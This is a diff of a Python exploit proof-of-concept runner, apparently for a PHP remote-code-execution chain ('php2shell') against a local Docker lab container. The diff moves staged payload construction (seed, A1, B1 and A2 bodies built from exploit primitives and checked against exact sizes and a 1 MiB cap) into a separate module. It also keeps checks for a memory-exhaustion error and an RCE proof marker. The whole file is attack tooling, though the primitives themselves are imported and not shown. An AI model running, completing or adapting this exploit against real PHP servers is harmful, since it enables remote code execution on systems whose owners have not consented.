@@ -9,10 +9,9 @@ from pathlib import Path
 import subprocess
 
 import exploit_primitives as exploit
+from exploit_chain import OOM_MARKER, PayloadError, PayloadSet, ensure_request_size
 from lab_runtime import DockerTarget, HttpResponse, LocalHttpClient, PostOptions
 
-EXPECTED_SIZES = {"seed": 305042, "A1": 1045243, "B1": 339678, "A2": 279369}
-OOM_MARKER = b"Allowed memory size"
 PROOF_MARKER = "LOCAL_PHP2SHELL_RCE_PROOF"
 
 class ProofError(RuntimeError):
@@ -24,37 +23,6 @@ class ProofConfig:
     port: int
     attempts: int
     proof_log: Path
-
-@dataclass(frozen=True, slots=True)
-class PayloadSet:
-    seed: bytes
-    a1: bytes
-    b1: bytes
-    a2: bytes
-
-    @classmethod
-    def create(cls) -> PayloadSet:
-        seed_specification = exploit.CheapBodySpec(880, 64, 0, b"a", b"k0", 32768, 1)
-        a2_specification = exploit.CheapBodySpec(880, 64, 115, b"a" * 32, b"k0")
-        payloads = (
-            exploit.build_cheap_body(seed_specification),
-            exploit.build_a1(),
-            exploit.build_b1(),
-            exploit.build_cheap_body(a2_specification),
-        )
-        return cls(*payloads)
-
-    def items(self) -> tuple[tuple[str, bytes], ...]:
-        return (("seed", self.seed), ("A1", self.a1), ("B1", self.b1), ("A2", self.a2))
-
-    def validate(self) -> None:
-        for name, body in self.items():
-            if len(body) != EXPECTED_SIZES[name]:
-                raise ProofError(f"{name} size mismatch: {len(body)} != {EXPECTED_SIZES[name]}")
-            ensure_request_size(name, body)
-
-    def size_line(self) -> str:
-        return "sizes " + " ".join(f"{name}={len(body)}" for name, body in self.items())
 
 @dataclass(frozen=True, slots=True)
 class LeakAttempt:
@@ -148,10 +116,6 @@ def require_oom(stage: str, response: HttpResponse) -> None:
     if OOM_MARKER not in response.raw:
         raise ProofError(f"{stage} OOM was not observed ({response.status!r}, {len(response.raw)} bytes)")
 
-def ensure_request_size(stage: str, body: bytes) -> None:
-    if len(body) >= exploit.MAX_REQUEST_BODY:
-        raise ProofError(f"{stage} exceeds the 1 MiB request-body cap: {len(body)}")
-
 def parse_config() -> ProofConfig:
     parser = argparse.ArgumentParser()
     parser.add_argument("--container", default="php2shell-local-proof")
@@ -164,7 +128,7 @@ def parse_config() -> ProofConfig:
 def main() -> int:
     try:
         ProofRunner(parse_config()).run()
-    except (OSError, ProofError, subprocess.SubprocessError) as error:
+    except (OSError, PayloadError, ProofError, subprocess.SubprocessError) as error:
         raise SystemExit(str(error)) from None
     return 0
 
